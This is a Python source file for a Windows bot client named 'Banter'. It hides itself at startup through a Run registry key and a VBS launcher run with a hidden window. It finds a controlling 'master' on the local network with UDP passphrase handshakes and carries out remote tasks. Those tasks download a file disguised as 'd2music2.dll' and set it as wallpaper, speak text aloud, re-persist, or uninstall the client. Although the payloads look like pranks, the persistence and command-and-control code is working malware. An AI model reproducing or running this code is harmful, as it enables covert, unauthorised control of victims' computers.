# banter
import socket
import sys
import netifaces
import ipaddress
import subprocess
import logging
import time
import io
import os

import win32api, win32con, win32gui
import win32com.client

class Banter():

    def __init__(self, debug_build=False, persist=True):
        if debug_build:
            logging.basicConfig(level=logging.DEBUG)
            logging.debug("Debug build")
        else: 
            logging.basicConfig(level=logging.CRITICAL)
        self.PERSISTENCE_KEY = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        self.REG_KEY_ENTRY = "slash"
        self.PORT = 34072
        self.TASKING_PORT = 34073
        self.BUFFER_SIZE = 8192
        self.TASKING_WINDOW = 10
        self.FIND_MASTER_LIMIT = 16
        if logging.getLogger().level == logging.DEBUG:
            self.MASTER_SEARCH_SLEEP = 10
            # self.TASKING_SLEEP = 20
        else:
            self.MASTER_SEARCH_SLEEP = 60
            # self.TASKING_SLEEP = 60
        # How many empty tasking windows before trying to find master again
        self.LAST_HEARD_LIMIT = 60      # 10 minutes (60 * 10sec tasking window)
        # How many times to attempt a connection before aborting
        self.CONNECTION_ATTEMPT_LIMIT = 5

        self.PERSIST = persist

        self.name = self.get_name()
        logging.debug("Name: {0}".format(self.name))
        self.master = None
        self.gateway = None

        self.client_interface = None
        self.client_network = None

        self.find_master_window = 2

    def get_name(self):
        try:
            key = win32api.RegOpenKeyEx(win32con.HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName",0,win32con.KEY_QUERY_VALUE)
            name = win32api.RegQueryValueEx(key, "ComputerName")[0]
            win32api.RegCloseKey(key)
        except:
            name = "Unnamed"
        return name

    def persist(self, persist):
        dir_name = os.path.dirname(os.path.abspath(__file__))
        vbs_script_file = os.path.join(dir_name, "slashd2.vbs")
        if persist:
            if not os.path.exists(vbs_script_file):
                curr_file = win32api.GetModuleFileName(0)
                vbs_script = open(vbs_script_file, "w")
                vbs_script.write('Dim WShell\nSet WShell = CreateObject("Wscript.Shell")\nWShell.Run "{0} r", 0\nSet WShell = Nothing'.format(curr_file))
                vbs_script.close()
                startup_script ="wscript \"{0}\"".format(vbs_script_file)
                curr_script = None
                try:
                    key = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER,self.PERSISTENCE_KEY,0,win32con.KEY_QUERY_VALUE)
                    curr_script = win32api.RegQueryValueEx(key, self.REG_KEY_ENTRY)
                    win32api.RegCloseKey(key)
                except Exception as e: 
                    logging.exception("Unhandled Exception: {0}".format(e))
                # if curr_script is None (no value) or incorrect, replace with correct one
                if startup_script != curr_script:
                    logging.debug("Adding {0} to run on startup...".format(curr_file))
                    logging.debug("Script executed by registry key on boot: {0}".format(startup_script))
                    try:
                        key = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER,self.PERSISTENCE_KEY,0,win32con.KEY_SET_VALUE)
                        win32api.RegSetValueEx(key, self.REG_KEY_ENTRY, 0, win32con.REG_SZ, "{0}".format(startup_script))
                        win32api.RegCloseKey(key)
                    except Exception as e: 
                        logging.exception("Unhandled Exception: {0}".format(e))
        else:
            logging.debug("Removing from startup...")
            if os.path.exists(vbs_script_file):
                logging.debug("Removing vbs script.")
                try:
                    os.remove(vbs_script_file)
                except Exception as e:
                    logging.exception("Unhandled Exception: {0}".format(e))
            try:
                key = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER,self.PERSISTENCE_KEY,0,win32con.KEY_SET_VALUE)
                win32api.RegDeleteValue(key, self.REG_KEY_ENTRY)
                win32api.RegCloseKey(key)
            except Exception as e: 
                logging.exception("Unhandled Exception: {0}".format(e))

    """ Link up with master """
    def find_master(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(self.find_master_window)
        if self.master:
            if self.attempt_linkup(sock, self.master):
                logging.debug("Master found: {0}".format(self.master))
                sock.close()
                return True
            else:
                logging.debug("Old master {0} not linking, wiping.".format(self.master))
                self.master = None
        else:
            try:
                ips = self.determine_addresses()
            except:
                return False
            # if logging.getLogger().level == logging.DEBUG:
            # #     # ips = [self.client_interface.ip]
            # ips = [ipaddress.IPv4Address('10.0.0.128')]
            # else:
            # ips = self.ping_sweep(ips)
            # logging.debug("Master candidates:" + str(ips))
            for address in ips:
                if self.attempt_linkup(sock, address):
                    logging.debug("Master found: {0}".format(address))
                    sock.close()
                    return True
            logging.debug("Master not found")
            if self.find_master_window < self.FIND_MASTER_LIMIT:
                logging.debug("Increasing socket timeout")
                self.find_master_window *= 2
                    
        sock.close()
        return False

    """ Check interfaces and determine LAN subnet/s to be scanned for master """
    def determine_addresses(self):
        try:
            self.gateway, interface_uuid = self.determine_gateway2()
            if self.gateway is None or interface_uuid is None:
                self.gateway, interface_uuid = self.determine_gateway()
        except:
            self.gateway, interface_uuid = self.determine_gateway()

        interface = netifaces.ifaddresses(interface_uuid)
        self.client_interface = ipaddress.ip_interface('{0}/{1}'.format(interface[netifaces.AF_INET][0]['addr'],interface[netifaces.AF_INET][0]['netmask']))
        self.client_network = ipaddress.ip_network(self.client_interface.network)
        logging.debug("Client ip: {0}".format(self.client_interface))
        return list(self.client_network.hosts())

    """ Grab the interface marked as default """
    def determine_gateway(self):
        # Get default gateway, get associated ip address and generate addresses to scan
        try:
            logging.debug("Using default gateway...")
            gws = netifaces.gateways()
            default_gateway = gws['default'][netifaces.AF_INET]
            logging.debug(" * Success!")
            return default_gateway
        except:
            logging.debug(" * Failed!")
            raise

    """ Run a tracert to google.com to determine the internet-facing gateway, and grab that interface """
    def determine_gateway2(self):
        try:
            logging.debug("Using tracert to determine gateway address...")
            output = subprocess.Popen(['tracert', '-4', '-d', '-h', '1', 'google.com'], stdout=subprocess.PIPE).communicate()[0]
            # Get rid of the heading crap and retrieve the first entry which contains the gateway IP
            i_gw = output.split(b"\r\n")[4].split()[-1].decode()

            gws = netifaces.gateways()[netifaces.AF_INET]
            # Look for the interface with the correct gateway IP
            for gw in gws:
                if gw[0] == i_gw:
                    logging.debug(" * Success!")
                    return gw[0], gw[1]
            logging.debug(" * Failed!")
            return None, None
        except:
            logging.debug(" * Failed!")
            raise

    # """ Reduce ip set to hosts that are pingable """
    # def ping_sweep(self, ips):
    #     logging.debug("Pinging hosts...")
    #     online_ips = []
    #     for ip in ips:
    #         output = subprocess.Popen(['ping', '-n', '1', '-w', '{0}'.format(self.ping_timeout), str(ip)], stdout=subprocess.PIPE).communicate()[0]
    #         if "Destination host unreachable" in output.decode('utf-8'):
    #             pass
    #         elif "Request timed out" in output.decode('utf-8'):
    #             pass
    #         else:
    #             logging.debug("* {0}".format(ip))
    #             online_ips.append(ip)
    #     return online_ips

        
    """ Attempt link-up with address """
    def attempt_linkup(self, sock, address):
        logging.debug("Attempting linkup: {0}".format(address))
        try:
            sock.sendto(b"Speak friend and enter", (str(address), self.PORT))
            logging.debug("{0} < '{1}'".format(str(address),b"Speak friend and enter"))
            data, addr = sock.recvfrom(self.BUFFER_SIZE)
            logging.debug("{0} > '{1}'".format(addr[0],data))

            if data == b"RockMelon69":
                self.master = addr[0]
                info = bytes(self.name + "BossTha", "ascii")
                sock.sendto(info, addr)
                logging.debug("{0} < '{1}'".format(addr[0],info))
                return True
        except:
            pass
        return False

    def process_tasking(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(self.TASKING_WINDOW)
        tasking_start = time.time()
        while time.time() < tasking_start + self.TASKING_WINDOW:
            try:
                sock.sendto(b"Awaiting orders", (self.master, self.TASKING_PORT))
                data, addr = sock.recvfrom(self.BUFFER_SIZE)
                logging.debug("{0} > {1}".format(addr[0], data))
                if addr[0] == self.master:
                    ack = data[:4] + b"BossTha"
                    logging.debug("{0} < {1}".format(addr[0], ack))
                    sock.sendto(ack, addr)
                    if self.parse_task(str(data, "ascii")):
                        self.send_task_result(True)
                    else:
                        self.send_task_result(False)
                    sock.close()
                    return True
            except ConnectionResetError:
                # Server currently not tasking, beacon didn't get thru
                time.sleep(2)
            except socket.timeout:
                # Beacon got thru, server didn't respond with task in time
                time.sleep(2)
        sock.close()
        return False

    """ Receive and acknowledge tasking from master """
    """ OLD METHOD: Requires client to have listening port """
    def process_tasking_old(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(self.TASKING_WINDOW)
        sock.bind(('', self.TASKING_PORT))
        data, addr = sock.recvfrom(self.BUFFER_SIZE)
        logging.debug("{0} > {1}".format(addr[0], data))
        if addr[0] == self.master:
            ack = data[:4] + b"BossTha"
            logging.debug("{0} < {1}".format(addr[0], ack))
            sock.sendto(ack, addr)
            if self.parse_task(str(data, "ascii")):
                self.send_task_result(True)
            else:
                self.send_task_result(False)
        sock.close()

    """ Parse and action tasks """
    def parse_task(self, task):
        task = task.split(",")
        if task[0] == "hi":
            return True
        elif task[0] == "cb":
            return self.change_background_task(int(task[1]))
        elif task[0] == "ss":
            return self.speak_task(task[1])
        elif task[0] == "kys":
            self.kill_task()
        elif task[0] == "sa":
            self.persist_task()
        else:
            pass
    
    def send_task_result(self, result):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                if result:
                    sock.sendto(b"Jobs done!", (self.master, self.PORT))
                else:
                    sock.sendto(b"Nope", (self.master, self.PORT))
        except Exception as e: 
            logging.exception("Unhandled Exception: {0}".format(e))

    """ Change background task """
    def change_background_task(self, serving_port):
        # Download image from master
        image = self.request_file(serving_port)
        if image is None:
            logging.debug("Image download failed.")
            return
        logging.debug("Downloaded image.")
        logging.debug("File stored at: {0}".format(image))

        # Change background
        return self.set_background(image)

    def request_file(self, serving_port):
        try:
            file_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            file_sock.settimeout(10)
            attempts = 0
            while True:
                attempts += 1
                if attempts > self.CONNECTION_ATTEMPT_LIMIT:
                    logging.debug("Connection failed.")
                    return
                try:
                    file_sock.connect((self.master, serving_port))
                    break
                except Exception as e:
                    logging.warning("Unhandled Excpetion: {0}".format(e))
                    continue
        except Exception as e:
            logging.warning("Unhandled Exception: {0}".format(e))
            return False
        try:    
            file_sock.send(b"plsehlp")
            logging.debug("{0} < '{1}'".format(self.master, b"plsehlp"))
            
            # image = io.BytesIO()
            image = open("d2music2.dll", "wb")
            data = file_sock.recv(self.BUFFER_SIZE)
            while data:
                image.write(data)
                data = file_sock.recv(self.BUFFER_SIZE)
            file_sock.close()
            path = image.name
            image.close()
            return os.path.abspath(path)
        except Exception as e:
            logging.warning("Unhandled Exception: {0}".format(e))
            return None
        finally:
            file_sock.close()

    def set_background(self, image):
        logging.debug("Setting background to: {0}".format(image))
        try:
            key = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER,"Control Panel\\Desktop",0,win32con.KEY_SET_VALUE)
            win32api.RegSetValueEx(key, "WallpaperStyle", 0, win32con.REG_SZ, "2")
            win32api.RegSetValueEx(key, "TileWallpaper", 0, win32con.REG_SZ, "0")
            win32gui.SystemParametersInfo(win32con.SPI_SETDESKWALLPAPER, image, 1+2)
            win32api.RegCloseKey(key)
            return True
        except Exception as e:
            logging.warning("Unhandled Exception: {0}".format(e))
            return False

    """ Speak task """

    def speak_task(self, sentence):
        logging.debug("Speaking sentence: {0}".format(sentence))
        try:
            speak = win32com.client.Dispatch("SAPI.SpVoice")
            return speak.Speak(sentence)
        except Exception as e:
            logging.warning("Unhandled Exception: {0}".format(e))
            return False

    """ Kill client task """

    def kill_task(self):
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.sendto(b"Auf Wiedersehen...", (self.master, self.PORT))
        self.persist(False)
        sys.exit()

    def persist_task(self):
        self.persist(True)
        return True

    """ Main loop """
    def start(self):
        logging.debug("Starting up")
        if self.PERSIST:
            # Add to persistence
            self.persist(True)
        # Find master
        while True:
            logging.debug("Searching for master...")
            if self.find_master():
                self.find_master_window = 2
                # Main loop
                last_heard = 0

                while last_heard < self.LAST_HEARD_LIMIT:
                    logging.debug("Processing tasking...")
                    if self.process_tasking():
                        last_heard = 0
                    else:
                        logging.debug("No tasking received.")
                        last_heard += 1
                    # except Exception as e:
                    #     logging.debug("Exception: {0}".format(e))
                logging.debug("No tasking received for too long. Relinking with master.")
            time.sleep(self.MASTER_SEARCH_SLEEP)

if __name__ == "__main__":
    debug = False
    persist = True
    if "debug" in sys.argv:
        debug = True
    if "r" in sys.argv:
        persist = False
    client = Banter(debug, persist)
    client.start()